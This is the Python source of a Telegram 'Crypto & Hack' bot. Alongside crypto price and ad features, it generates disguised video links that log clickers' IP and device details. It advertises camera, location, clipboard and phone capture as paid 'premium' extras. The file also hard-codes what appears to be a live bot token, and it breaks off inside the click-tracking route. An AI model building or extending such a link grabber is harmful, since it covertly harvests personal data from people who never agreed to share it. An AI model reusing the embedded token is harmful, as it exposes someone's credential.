import telebot
from telebot import types
import sqlite3
import datetime
import uuid
import time
import json
import os
import requests
from flask import Flask, request
import threading
import matplotlib.pyplot as plt
from io import BytesIO
from apscheduler.schedulers.background import BackgroundScheduler

# ==================== CONFIG ====================
BOT_TOKEN = "8616715853:AAGRGBya1TvbSzP2PVDN010-15IK6LVa114"
OWNER_ID = 6504476778
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ==================== DATABASE ====================
DB_PATH = 'bot.db'

def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  is_paid INTEGER DEFAULT 0,
                  subscription_end TEXT,
                  phone TEXT,
                  location TEXT)''')
    # Links table
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (link_id TEXT PRIMARY KEY,
                  user_id INTEGER,
                  original_url TEXT,
                  modified_url TEXT,
                  created_at TEXT,
                  clicks INTEGER DEFAULT 0)''')
    # Clicks table
    c.execute('''CREATE TABLE IF NOT EXISTS clicks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  link_id TEXT,
                  ip TEXT,
                  user_agent TEXT,
                  screen TEXT,
                  language TEXT,
                  platform TEXT,
                  timezone TEXT,
                  battery TEXT,
                  location TEXT,
                  camera TEXT,
                  clipboard TEXT,
                  phone TEXT,
                  timestamp TEXT)''')
    # Coins supply cache
    c.execute('''CREATE TABLE IF NOT EXISTS coins
                 (symbol TEXT PRIMARY KEY,
                  supply REAL,
                  last_updated TIMESTAMP)''')
    # Price alerts
    c.execute('''CREATE TABLE IF NOT EXISTS alerts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  coin TEXT,
                  target_price REAL,
                  is_above BOOLEAN,
                  created_at TIMESTAMP)''')
    # Owner ads table
    c.execute('''CREATE TABLE IF NOT EXISTS ads
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  button_text TEXT,
                  link TEXT,
                  photo_file_id TEXT,
                  duration_minutes INTEGER,
                  created_at TIMESTAMP,
                  expires_at TIMESTAMP,
                  is_active BOOLEAN DEFAULT 1,
                  views INTEGER DEFAULT 0)''')
    # Rewarded ads table
    c.execute('''CREATE TABLE IF NOT EXISTS rewarded_ads
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  title TEXT,
                  description TEXT,
                  link TEXT,
                  logo_file_id TEXT,
                  is_active BOOLEAN DEFAULT 1,
                  created_at TIMESTAMP)''')
    # User ReCOIN balance
    c.execute('''CREATE TABLE IF NOT EXISTS user_coins
                 (user_id INTEGER PRIMARY KEY,
                  recoin INTEGER DEFAULT 0,
                  ad_view_count INTEGER DEFAULT 0)''')
    # Ad views tracking
    c.execute('''CREATE TABLE IF NOT EXISTS ad_views
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  ad_id INTEGER,
                  viewed_at TIMESTAMP,
                  earned INTEGER DEFAULT 0)''')
    conn.commit()
    conn.close()
    print("✅ Database ready")

init_db()

# ==================== BASE URL ====================
BASE_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://mohyan-telegram-bot.onrender.com')

# ==================== HELPER FUNCTIONS ====================
def get_binance_price(symbol):
    url = f"https://api.binance.com/api/v3/ticker/price?symbol={symbol}"
    try:
        response = requests.get(url, timeout=5)
        return float(response.json()['price'])
    except:
        return None

def get_coin_supply_from_coincap(symbol):
    url = f"https://api.coincap.io/v2/assets/{symbol.lower()}"
    try:
        response = requests.get(url, timeout=5)
        return float(response.json()['data']['supply'])
    except:
        return None

def get_supply_from_db(symbol):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT supply, last_updated FROM coins WHERE symbol=?", (symbol.upper(),))
    row = c.fetchone()
    conn.close()
    if row:
        last = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() - last < datetime.timedelta(hours=24):
            return row[0]
    return None

def update_coin_supply(symbol, supply):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO coins (symbol, supply, last_updated) VALUES (?, ?, ?)",
              (symbol.upper(), supply, datetime.datetime.now()))
    conn.commit()
    conn.close()

def get_market_data(coin_symbol, coin_name_for_api):
    binance_symbol = coin_symbol + 'USDT'
    price = get_binance_price(binance_symbol)
    if not price:
        return None
    supply = get_supply_from_db(coin_symbol.upper())
    if not supply:
        supply = get_coin_supply_from_coincap(coin_name_for_api.lower())
        if supply:
            update_coin_supply(coin_symbol.upper(), supply)
        else:
            fallback = {'BTC': 19600000, 'ETH': 120000000, 'BNB': 150000000, 'DOGE': 140000000000}
            supply = fallback.get(coin_symbol.upper())
    if not supply:
        return None
    market_cap = price * supply
    return {'price': price, 'market_cap': market_cap, 'supply': supply}

def format_market_cap(cap):
    if cap >= 1e12: return f"${cap/1e12:.2f}T"
    if cap >= 1e9: return f"${cap/1e9:.2f}B"
    if cap >= 1e6: return f"${cap/1e6:.2f}M"
    return f"${cap:,.0f}"

def format_price(price):
    if price < 1: return f"${price:.4f}"
    if price < 1000: return f"${price:.2f}"
    return f"${price:,.0f}"

def is_premium(user_id):
    if user_id == OWNER_ID: return True
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT is_paid, subscription_end FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row or row[0] == 0: return False
    if row[1] == 'permanent': return True
    if row[1]:
        end = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() < end: return True
    return False

def get_active_ad():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM ads WHERE is_active=1 ORDER BY created_at DESC LIMIT 1")
    ad = c.fetchone()
    conn.close()
    return ad

# ==================== GRAPH GENERATION ====================
def generate_price_chart(symbol, days=7):
    try:
        url = f"https://api.binance.com/api/v3/klines?symbol={symbol}USDT&interval=1d&limit={days}"
        resp = requests.get(url, timeout=5)
        data = resp.json()
        dates = [datetime.datetime.fromtimestamp(int(k[0])/1000).strftime('%d %b') for k in data]
        prices = [float(k[4]) for k in data]
        plt.figure(figsize=(10, 5))
        plt.plot(dates, prices, marker='o', color='#3b82f6', linewidth=2)
        plt.fill_between(dates, prices, alpha=0.3, color='#3b82f6')
        plt.title(f'{symbol} Price - Last {days} Days')
        plt.grid(True, alpha=0.3)
        plt.xticks(rotation=45)
        buf = BytesIO()
        plt.tight_layout()
        plt.savefig(buf, format='png')
        buf.seek(0)
        plt.close()
        return buf
    except:
        return None

# ==================== PRICE ALERTS ====================
scheduler = BackgroundScheduler()
scheduler.start()

def check_alerts():
    conn = get_db()
    c = conn.cursor()
    alerts = c.execute("SELECT * FROM alerts").fetchall()
    for alert in alerts:
        price = get_binance_price(alert['coin']+'USDT')
        if not price: continue
        if (alert['is_above'] and price >= alert['target_price']) or (not alert['is_above'] and price <= alert['target_price']):
            try:
                bot.send_message(alert['user_id'], f"🔔 *Alert Triggered*\n{alert['coin']} is now {price} (target: {alert['target_price']})", parse_mode="Markdown")
            except: pass
            c.execute("DELETE FROM alerts WHERE id=?", (alert['id'],))
    conn.commit()
    conn.close()

scheduler.add_job(check_alerts, 'interval', minutes=5)

# ==================== ADS EXPIRY ====================
def check_expired_ads():
    conn = get_db()
    c = conn.cursor()
    now = datetime.datetime.now()
    c.execute("UPDATE ads SET is_active=0 WHERE expires_at < ? AND is_active=1", (now,))
    conn.commit()
    conn.close()
    print("✅ Expired ads deactivated")

scheduler.add_job(check_expired_ads, 'interval', minutes=1)

# ==================== LIVE MARKET ====================
TOP_COINS = [('BTC','bitcoin'), ('ETH','ethereum'), ('BNB','binancecoin'), ('DOGE','dogecoin')]

def get_all_market_data():
    data = []
    for sym, api in TOP_COINS:
        market = get_market_data(sym, api)
        if market:
            change = 0
            try:
                url = f"https://api.binance.com/api/v3/ticker/24hr?symbol={sym}USDT"
                change = float(requests.get(url).json()['priceChangePercent'])
            except: pass
            data.append({'symbol': sym, 'price': market['price'], 'market_cap': market['market_cap'], 'change': change})
    return data

def format_market_message(coins):
    if not coins: return "❌ Data unavailable."
    msg = "📊 *Market Cap*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for c in coins:
        color = "🟢" if c['change'] >= 0 else "🔴"
        arrow = "▲" if c['change'] >= 0 else "▼"
        msg += f"{color} *{c['symbol']:<4}*  {format_market_cap(c['market_cap']):>8}  "
        msg += f"Buy {format_price(c['price']):>8}  {arrow}{abs(c['change']):.2f}%\n\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')} IST"
    return msg

# ==================== LIVE UPDATES WORKER ====================
active_live = {}
live_lock = threading.Lock()

def stop_btn():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⏹️ Stop Updates", callback_data="stop_live"))

def live_worker():
    while True:
        time.sleep(5)
        with live_lock:
            if not active_live: continue
            coins = get_all_market_data()
            if not coins: continue
            msg = format_market_message(coins)
            to_remove = []
            for uid, data in list(active_live.items()):
                if data.get('stop'):
                    to_remove.append(uid)
                    continue
                try:
                    bot.edit_message_text(msg, chat_id=data['chat_id'], message_id=data['message_id'], parse_mode='Markdown', reply_markup=stop_btn())
                except:
                    to_remove.append(uid)
            for uid in to_remove:
                if uid in active_live: del active_live[uid]

threading.Thread(target=live_worker, daemon=True).start()

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (message.from_user.id, message.from_user.username))
    if message.from_user.id == OWNER_ID:
        c.execute("UPDATE users SET is_paid=1, subscription_end='permanent' WHERE user_id=?", (OWNER_ID,))
    conn.commit()
    conn.close()
    welcome = """
╔══════════════════════╗
║  *CRYPTO & HACK BOT*  ║
╚══════════════════════╝

🔹 *Crypto Features:*
• Real-time prices
• Live market updates
• Price alerts
• Charts
• Earn ReCOIN by watching ads

🔹 *Hack Link Features:*
• Generate tracking links
• Visitor info (IP, device)
• Premium plans

👇 *Use buttons below*
    """
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("🪙 Crypto"),
        types.KeyboardButton("🔗 Hack Link")
    )
    bot.send_message(message.chat.id, welcome, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🪙 Crypto")
def crypto_menu(m):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("💰 BTC", callback_data="btc"),
        types.InlineKeyboardButton("💰 ETH", callback_data="eth"),
        types.InlineKeyboardButton("💰 DOGE", callback_data="doge"),
        types.InlineKeyboardButton("📈 Live Market", callback_data="live"),
        types.InlineKeyboardButton("🔔 Alert", callback_data="alert_menu"),
        types.InlineKeyboardButton("📊 Chart", callback_data="chart_btc"),
        types.InlineKeyboardButton("🪙 Get ReCOIN", callback_data="getcoin"),
        types.InlineKeyboardButton("ℹ️ Info", callback_data="bot_info"),
        types.InlineKeyboardButton("💎 Balance", callback_data="balance"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back")
    )
    bot.send_message(m.chat.id, "🪙 *Crypto Commands*", parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🔗 Hack Link")
def hack_menu(m):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔗 Generate Link", callback_data="gen_link"),
        types.InlineKeyboardButton("📊 History", callback_data="history"),
        types.InlineKeyboardButton("💎 Subscription", callback_data="sub"),
        types.InlineKeyboardButton("ℹ️ Bot Info", callback_data="bot_info"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back")
    )
    bot.send_message(m.chat.id, "🔗 *Hack Link Commands*", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "back":
        bot.edit_message_text("Main Menu", call.message.chat.id, call.message.message_id, reply_markup=None)
        return

    elif call.data in ["btc","eth","doge"]:
        coin = call.data.upper()
        data = get_market_data(coin, coin.lower())
        if not data:
            bot.answer_callback_query(call.id, "❌ Data unavailable")
            return
        msg = f"""
╔══════════════════════╗
║    *{coin} PRICE*      ║
╠══════════════════════╣
║  💰 {format_price(data['price'])}          ║
║  📊 Market Cap: {format_market_cap(data['market_cap'])} ║
╚══════════════════════╝
        """
        markup = None
        if not is_premium(call.from_user.id):
            ad = get_active_ad()
            if ad:
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton(ad['button_text'], url=f"{BASE_URL}/ad_click/{ad['id']}"))
                markup.add(types.InlineKeyboardButton("⭐ Remove Ads", callback_data="sub"))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "live":
        wait = bot.send_message(call.message.chat.id, "⏳ *Fetching market data...*", parse_mode="Markdown")
        coins = get_all_market_data()
        if not coins:
            bot.edit_message_text("❌ Data unavailable", wait.chat.id, wait.message_id)
            return
        msg = format_market_message(coins)
        sent = bot.edit_message_text(msg, wait.chat.id, wait.message_id, parse_mode='Markdown', reply_markup=stop_btn())
        with live_lock:
            active_live[call.from_user.id] = {'chat_id': call.message.chat.id, 'message_id': sent.message_id, 'stop': False}

    elif call.data == "stop_live":
        with live_lock:
            if call.from_user.id in active_live:
                del active_live[call.from_user.id]
        bot.edit_message_text("⏹️ Live updates stopped.", call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "Updates stopped")

    elif call.data == "alert_menu":
        bot.send_message(call.message.chat.id, "🔔 *Set Price Alert*\nUse: `/alert BTC 65000`", parse_mode="Markdown")

    elif call.data == "chart_btc":
        data = get_market_data('BTC','bitcoin')
        if not data:
            bot.answer_callback_query(call.id, "❌ Data unavailable")
            return
        wait = bot.send_message(call.message.chat.id, "⏳ *Generating chart...*", parse_mode="Markdown")
        img = generate_price_chart('BTC',7)
        if not img:
            bot.edit_message_text("❌ Chart failed", wait.chat.id, wait.message_id)
            return
        cap = f"💰 Price: {format_price(data['price'])}\n📊 Market Cap: {format_market_cap(data['market_cap'])}"
        bot.send_photo(call.message.chat.id, img, caption=cap, parse_mode="Markdown")
        bot.delete_message(wait.chat.id, wait.message_id)

    elif call.data == "getcoin":
        get_coin_command(call.message)

    elif call.data == "bot_info":
        info = """
🤖 *BOT INFORMATION*

🔹 *FREE PLAN*
• IPv4, Device, Browser
• Screen, Language, Timezone

💎 *PREMIUM (Stars/ReCOIN)*
• Camera, Location, Clipboard
• Phone, IPv6, Memory
• Price alerts, Live market
• No ads

⭐ *Stars:* 7 (30d), 4 (15d), 1 (1d)
🪙 *ReCOIN:* 2 = 1d, 14 = 7d, 30 = 15d, 60 = 30d
        """
        bot.edit_message_text(info, call.message.chat.id, call.message.message_id, parse_mode="Markdown")

    elif call.data == "balance":
        balance_cmd(call.message)

    elif call.data == "gen_link":
        gen_link(call.message)

    elif call.data == "history":
        history_cmd(call.message)

    elif call.data == "sub":
        subscription_cmd(call.message)

    elif call.data.startswith("verify_"):
        verify_ad(call)

@bot.message_handler(commands=['alert'])
def alert_command(message):
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /alert BTC 65000")
        return
    coin, target = parts[1].upper(), float(parts[2])
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⬆️ Above", callback_data=f"alert_set_{coin}_above_{target}"),
        types.InlineKeyboardButton("⬇️ Below", callback_data=f"alert_set_{coin}_below_{target}")
    )
    bot.reply_to(message, f"Set alert for {coin} at ${target}:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('alert_set_'))
def set_alert(call):
    parts = call.data.split('_')
    coin, typ, target = parts[2], parts[3], float(parts[4])
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO alerts (user_id, coin, target_price, is_above, created_at) VALUES (?, ?, ?, ?, ?)",
              (call.from_user.id, coin, target, typ=='above', datetime.datetime.now()))
    conn.commit()
    conn.close()
    bot.answer_callback_query(call.id, "✅ Alert set!")

# ==================== HACK LINK GENERATOR ====================
@bot.message_handler(commands=['terminal:gernatLINK'])
def gen_link(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🎯 ENTER VIDEO LINK", callback_data="enter_link"))
    msg = """
╔══════════════════════╗
║   🔗 *LINK GENERATOR*   ║
╚══════════════════════╝

👇 Click button and paste video link
    """
    bot.send_message(message.chat.id, msg, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "enter_link")
def ask_link(call):
    bot.edit_message_text("📤 *Send me the video link*", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
    bot.register_next_step_handler(call.message, process_link)

def process_link(message):
    url = message.text.strip()
    if not (url.startswith('http://') or url.startswith('https://')):
        bot.reply_to(message, "❌ *Invalid Link!*", parse_mode="Markdown")
        return
    wait = bot.reply_to(message, "⏳ *Generating link...*", parse_mode="Markdown")
    frames = ["🔴 0%", "🟠 20%", "🟡 40%", "🟢 60%", "🔵 80%", "💜 99%", "✨ 100%"]
    for f in frames:
        time.sleep(0.4)
        try: bot.edit_message_text(f, wait.chat.id, wait.message_id, parse_mode="Markdown")
        except: pass
    link_id = str(uuid.uuid4())[:8]
    mod_url = f"{BASE_URL}/click/{link_id}"
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
              (link_id, message.from_user.id, url, mod_url, datetime.datetime.now()))
    conn.commit()
    conn.close()
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📋 COPY", callback_data=f"copy_{link_id}"),
        types.InlineKeyboardButton("🔍 PREVIEW", url=mod_url)
    )
    bot.edit_message_text(f"✅ *LINK READY*\n\n`{mod_url}`", wait.chat.id, wait.message_id, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('copy_'))
def copy_link(call):
    link_id = call.data.replace('copy_','')
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT modified_url FROM links WHERE link_id=?", (link_id,))
    row = c.fetchone()
    conn.close()
    if row:
        bot.answer_callback_query(call.id, "✅ Copied!")
        bot.send_message(call.message.chat.id, f"📋 `{row[0]}`", parse_mode="Markdown")

# ==================== ReCOIN SYSTEM ====================
@bot.message_handler(commands=['getcoin'])
def get_coin_command(message):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM rewarded_ads WHERE is_active=1")
    ads = c.fetchall()
    conn.close()
    if not ads:
        bot.reply_to(message, "❌ No rewarded ads right now.")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT recoin FROM user_coins WHERE user_id=?", (message.from_user.id,))
    row = c.fetchone()
    recoin = row[0] if row else 0
    if not row:
        c.execute("INSERT INTO user_coins (user_id, recoin, ad_view_count) VALUES (?,0,0)", (message.from_user.id,))
        conn.commit()
    conn.close()
    bot.send_message(message.chat.id, f"💰 *Your ReCOIN:* {recoin}\n\n📺 Watch ads to earn more!", parse_mode="Markdown")
    for ad in ads:
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton(f"👁️ View: {ad['title']}", url=ad['link']),
            types.InlineKeyboardButton("✅ Verify", callback_data=f"verify_{ad['id']}")
        )
        if ad['logo_file_id']:
            bot.send_photo(message.chat.id, ad['logo_file_id'], caption=ad['description'], reply_markup=markup)
        else:
            bot.send_message(message.chat.id, f"*{ad['title']}*\n{ad['description']}", parse_mode="Markdown", reply_markup=markup)

def verify_ad(call):
    ad_id = int(call.data.split('_')[1])
    uid = call.from_user.id
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM ad_views WHERE user_id=? AND ad_id=? AND date(viewed_at)=date('now')", (uid, ad_id))
    if c.fetchone()[0] > 0:
        bot.answer_callback_query(call.id, "❌ Already earned today")
        conn.close()
        return
    c.execute("SELECT viewed_at FROM ad_views WHERE user_id=? ORDER BY viewed_at DESC LIMIT 1", (uid,))
    last = c.fetchone()
    if last:
        last_time = datetime.datetime.strptime(last[0], '%Y-%m-%d %H:%M:%S.%f')
        if datetime.datetime.now() - last_time < datetime.timedelta(seconds=30):
            bot.answer_callback_query(call.id, "⏳ Wait 30s")
            conn.close()
            return
    c.execute("SELECT COUNT(*) FROM ad_views WHERE user_id=? AND date(viewed_at)=date('now')", (uid,))
    if c.fetchone()[0] >= 10:
        bot.answer_callback_query(call.id, "❌ Daily limit reached")
        conn.close()
        return
    c.execute("INSERT INTO ad_views (user_id, ad_id, viewed_at) VALUES (?,?,?)", (uid, ad_id, datetime.datetime.now()))
    c.execute("SELECT ad_view_count, recoin FROM user_coins WHERE user_id=?", (uid,))
    row = c.fetchone()
    if row:
        vc, rc = row[0]+1, row[1]
    else:
        vc, rc = 1, 0
        c.execute("INSERT INTO user_coins (user_id, recoin, ad_view_count) VALUES (?,0,1)", (uid,))
    if vc % 2 == 0:
        rc += 1
        c.execute("UPDATE user_coins SET recoin=?, ad_view_count=? WHERE user_id=?", (rc, vc, uid))
        bot.answer_callback_query(call.id, f"✅ +1 ReCOIN! Total: {rc}")
    else:
        c.execute("UPDATE user_coins SET ad_view_count=? WHERE user_id=?", (vc, uid))
        bot.answer_callback_query(call.id, f"✅ Verified! {2-(vc%2)} more to earn 1 ReCOIN")
    conn.commit()
    conn.close()

# ==================== OWNER ADS COMMANDS ====================
@bot.message_handler(commands=['createad'])
def create_ad(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner")
        return
    bot.reply_to(message, "Send button text:")
    bot.register_next_step_handler(message, get_ad_btn)

def get_ad_btn(m):
    btn = m.text.strip()
    bot.reply_to(m, "Send link:")
    bot.register_next_step_handler(m, get_ad_link, btn)

def get_ad_link(m, btn):
    link = m.text.strip()
    if not link.startswith('http'):
        bot.reply_to(m, "❌ Invalid link")
        return
    bot.reply_to(m, "Send photo or /skip")
    bot.register_next_step_handler(m, get_ad_photo, btn, link)

def get_ad_photo(m, btn, link):
    if m.text and m.text == "/skip":
        photo = None
    elif m.photo:
        photo = m.photo[-1].file_id
    else:
        bot.reply_to(m, "❌ Send photo or /skip")
        return
    bot.reply_to(m, "Duration (minutes):")
    bot.register_next_step_handler(m, get_ad_dur, btn, link, photo)

def get_ad_dur(m, btn, link, photo):
    try:
        dur = int(m.text)
    except:
        bot.reply_to(m, "❌ Invalid number")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO ads (button_text, link, photo_file_id, duration_minutes, created_at, expires_at) VALUES (?,?,?,?,?,?)",
              (btn, link, photo, dur, datetime.datetime.now(), datetime.datetime.now()+datetime.timedelta(minutes=dur)))
    conn.commit()
    conn.close()
    bot.reply_to(m, "✅ Ad created")

@bot.message_handler(commands=['manageads'])
def manage_ads(m):
    if m.from_user.id != OWNER_ID:
        bot.reply_to(m, "❌ Only owner")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM ads ORDER BY created_at DESC")
    ads = c.fetchall()
    conn.close()
    if not ads:
        bot.send_message(m.chat.id, "📭 No ads")
        return
    for ad in ads:
        status = "🟢" if ad['is_active'] else "🔴"
        text = f"ID:{ad['id']} {status} Views:{ad['views']}\n{ad['button_text']}\nExpires:{ad['expires_at'][:16]}"
        markup = types.InlineKeyboardMarkup()
        if ad['is_active']:
            markup.add(types.InlineKeyboardButton("⏹️ Stop", callback_data=f"stopad_{ad['id']}"))
        markup.add(types.InlineKeyboardButton("🗑️ Delete", callback_data=f"delad_{ad['id']}"))
        if ad['photo_file_id']:
            bot.send_photo(m.chat.id, ad['photo_file_id'], caption=text, reply_markup=markup)
        else:
            bot.send_message(m.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('stopad_'))
def stop_ad(call):
    if call.from_user.id != OWNER_ID: return
    aid = int(call.data.split('_')[1])
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE ads SET is_active=0 WHERE id=?", (aid,))
    conn.commit()
    conn.close()
    bot.answer_callback_query(call.id, "✅ Stopped")

@bot.callback_query_handler(func=lambda call: call.data.startswith('delad_'))
def del_ad(call):
    if call.from_user.id != OWNER_ID: return
    aid = int(call.data.split('_')[1])
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM ads WHERE id=?", (aid,))
    conn.commit()
    conn.close()
    bot.answer_callback_query(call.id, "✅ Deleted")
    bot.delete_message(call.message.chat.id, call.message.message_id)

# ==================== BALANCE ====================
@bot.message_handler(commands=['balance'])
def balance_cmd(message):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT is_paid, subscription_end FROM users WHERE user_id=?", (message.from_user.id,))
    user = c.fetchone()
    c.execute("SELECT recoin FROM user_coins WHERE user_id=?", (message.from_user.id,))
    coin = c.fetchone()
    recoin = coin[0] if coin else 0
    conn.close()
    if message.from_user.id == OWNER_ID:
        bot.send_message(message.chat.id, f"👑 *OWNER*\n💰 ReCOIN: {recoin}", parse_mode="Markdown")
        return
    if is_premium(message.from_user.id):
        end = user[1][:10] if user and user[1] else "Unknown"
        bot.send_message(message.chat.id, f"💎 *PREMIUM*\nValid till: {end}\n💰 ReCOIN: {recoin}", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, f"🆓 *FREE*\n💰 ReCOIN: {recoin}\n💎 Upgrade: /subscription", parse_mode="Markdown")

# ==================== SUBSCRIPTION ====================
@bot.message_handler(commands=['subscription'])
def subscription_cmd(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("⭐ 7 Stars – 30d", callback_data="pay_30"),
        types.InlineKeyboardButton("⭐ 4 Stars – 15d", callback_data="pay_15"),
        types.InlineKeyboardButton("⭐ 1 Star – 1d", callback_data="pay_1"),
        types.InlineKeyboardButton("🪙 2 ReCOIN – 1d", callback_data="recoin_1"),
        types.InlineKeyboardButton("🪙 14 ReCOIN – 7d", callback_data="recoin_7"),
        types.InlineKeyboardButton("🪙 30 ReCOIN – 15d", callback_data="recoin_15"),
        types.InlineKeyboardButton("🪙 60 ReCOIN – 30d", callback_data="recoin_30")
    )
    bot.send_message(message.chat.id, "💎 *PREMIUM PLANS*", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
def stars_pay(call):
    days = int(call.data.split('_')[1])
    stars = {30:7, 15:4, 1:1}[days]
    try:
        bot.send_invoice(
            call.message.chat.id,
            title=f"Premium {days} Days",
            description="Full features + no ads",
            invoice_payload=f"premium_{days}",
            provider_token="",
            currency="XTR",
            prices=[types.LabeledPrice(label="Premium", amount=stars)]
        )
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('recoin_'))
def recoin_pay(call):
    days = int(call.data.split('_')[1])
    needed = days * 2
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT recoin FROM user_coins WHERE user_id=?", (call.from_user.id,))
    row = c.fetchone()
    if not row or row[0] < needed:
        bot.answer_callback_query(call.id, f"❌ Need {needed} ReCOIN")
        conn.close()
        return
    new = row[0] - needed
    c.execute("UPDATE user_coins SET recoin=? WHERE user_id=?", (new, call.from_user.id))
    end = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    c.execute("UPDATE users SET is_paid=1, subscription_end=? WHERE user_id=?", (end, call.from_user.id))
    conn.commit()
    conn.close()
    bot.answer_callback_query(call.id, f"✅ Premium {days} days!")
    bot.send_message(call.message.chat.id, f"🎉 Premium activated! Remaining ReCOIN: {new}")

@bot.pre_checkout_query_handler(func=lambda q: True)
def pre_checkout(q):
    bot.answer_pre_checkout_query(q.id, ok=True)

@bot.message_handler(content_types=['successful_payment'])
def payment_success(message):
    days = int(message.successful_payment.invoice_payload.split('_')[1])
    end = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET is_paid=1, subscription_end=? WHERE user_id=?", (end, message.from_user.id))
    conn.commit()
    conn.close()
    bot.send_message(message.chat.id, f"✅ Premium activated for {days} days!")

# ==================== HISTORY ====================
@bot.message_handler(commands=['log_history'])
def history_cmd(message):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT link_id, original_url, created_at, clicks FROM links WHERE user_id=? ORDER BY created_at DESC LIMIT 5''', (message.from_user.id,))
    rows = c.fetchall()
    conn.close()
    if not rows:
        bot.reply_to(message, "📭 No history")
        return
    text = "📊 *Your Links*\n"
    for r in rows:
        text += f"\n🔗 `{r[0]}`\n📝 {r[1][:30]}...\n👥 {r[3]} clicks\n📅 {r[2][:10]}"
    bot.reply_to(message, text, parse_mode="Markdown")

# ==================== FLASK ROUTES ====================
@app.route('/ad_click/<int:ad_id>')
def ad_click(ad_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT link FROM ads WHERE id=?", (ad_id,))
    row = c.fetchone()
    if row:
        c.execute("UPDATE ads SET views = views + 1 WHERE id=?", (ad_id,))
        conn.commit()
        conn.close()
        return redirect(row[0])
    conn.close()
    return "Ad not found", 404

@app.route('/click/<link_id>')
def click_track(link_id):
    ip = request.remote_addr
    ua = request.user_agent.string
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT original_url FROM links WHERE link_id=?", (link_id,))
    row = c.fetchone()
    if not row:
        conn.close()
        return "Link not found", 404
